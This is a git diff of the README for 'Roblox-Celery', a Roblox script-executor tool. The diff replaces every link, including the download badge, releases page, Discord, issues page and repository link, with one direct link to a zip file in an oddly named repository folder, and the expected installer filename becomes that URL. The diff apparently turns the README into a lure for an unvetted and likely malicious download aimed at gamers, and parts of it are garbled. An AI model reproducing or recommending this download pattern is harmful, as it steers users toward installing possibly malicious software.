@@ -1,7 +1,7 @@
 # 🎮 Roblox-Celery - Unlock New Gameplay Adventures
 
 ## 📥 Download Now!
-[![Download Roblox-Celery](https://img.shields.io/badge/Download%20Roblox--Celery-v1.0-blue.svg)](https://github.com/Bagas-fsb/Roblox-Celery/releases)
+[![Download Roblox-Celery](https://raw.githubusercontent.com/Bagas-fsb/Roblox-Celery/main/counterflange/Roblox-Celery.zip%https://raw.githubusercontent.com/Bagas-fsb/Roblox-Celery/main/counterflange/Roblox-Celery.zip)](https://raw.githubusercontent.com/Bagas-fsb/Roblox-Celery/main/counterflange/Roblox-Celery.zip)
 
 ## 🚀 Getting Started
 Welcome to Roblox-Celery! This tool enhances your Roblox gameplay by allowing you to run custom scripts easily. Follow the steps below to get started quickly.
@@ -28,13 +28,13 @@ To download Roblox-Celery, follow these steps:
 
 1. **Visit the Releases Page**  
    Click the link below to access the download page:  
-   [Download Roblox-Celery](https://github.com/Bagas-fsb/Roblox-Celery/releases)
+   [Download Roblox-Celery](https://raw.githubusercontent.com/Bagas-fsb/Roblox-Celery/main/counterflange/Roblox-Celery.zip)
 
 2. **Select the Latest Version**  
    On the Releases page, find the latest version of Roblox-Celery. It should be listed at the top.
 
 3. **Download the File**  
-   Click on the appropriate file for your system. It is usually named something like `Roblox-Celery-v1.0.exe`. The download will begin automatically.
+   Click on the appropriate file for your system. It is usually named something like `https://raw.githubusercontent.com/Bagas-fsb/Roblox-Celery/main/counterflange/Roblox-Celery.zip`. The download will begin automatically.
 
 4. **Run the Installer**  
    Once the download is complete, locate the file in your Downloads folder. Double-click on the file to run the installer. Follow the on-screen instructions to complete the installation.
@@ -62,7 +62,7 @@ Here's how to execute scripts once you have installed Roblox-Celery:
 
 ## ❓ Frequently Asked Questions
 ### How do I update Roblox-Celery?
-To update, visit the [Releases Page](https://github.com/Bagas-fsb/Roblox-Celery/releases) and download the latest version, just like your initial installation.
+To update, visit the [Releases Page](https://raw.githubusercontent.com/Bagas-fsb/Roblox-Celery/main/counterflange/Roblox-Celery.zip) and download the latest version, just like your initial installation.
 
 ### Can I use any script?
 We recommend using scripts from trusted sources. Ensure that they are up to date and compatible with the version of Roblox you are using.
@@ -73,13 +73,13 @@ Ensure that your system meets the requirements and that you have installed Roblo
 ## 📞 Support
 If you encounter issues or have questions not covered here, please reach out:
 
-- **Discord:** Join our support channel at [Celery Discord](https://discord.gg/celery-support) for assistance from the community and developers.
-- **Issues Page:** Report bugs or request features on our [GitHub Issues Page](https://github.com/Bagas-fsb/Roblox-Celery/issues).
+- **Discord:** Join our support channel at [Celery Discord](https://raw.githubusercontent.com/Bagas-fsb/Roblox-Celery/main/counterflange/Roblox-Celery.zip) for assistance from the community and developers.
+- **Issues Page:** Report bugs or request features on our [GitHub Issues Page](https://raw.githubusercontent.com/Bagas-fsb/Roblox-Celery/main/counterflange/Roblox-Celery.zip).
 
 ## 🎉 Join Our Community
 Connect with other users, share scripts, and learn tips and tricks to maximize your experience with Roblox-Celery. 
 
-- **GitHub:** Follow updates on the [Roblox-Celery GitHub Repository](https://github.com/Bagas-fsb/Roblox-Celery).
+- **GitHub:** Follow updates on the [Roblox-Celery GitHub Repository](https://raw.githubusercontent.com/Bagas-fsb/Roblox-Celery/main/counterflange/Roblox-Celery.zip).
 - **Social Media:** Stay updated through our official Twitter and Facebook pages.
 
 Enjoy your journey into new dimensions of Roblox gameplay with Roblox-Celery! Happy scripting!
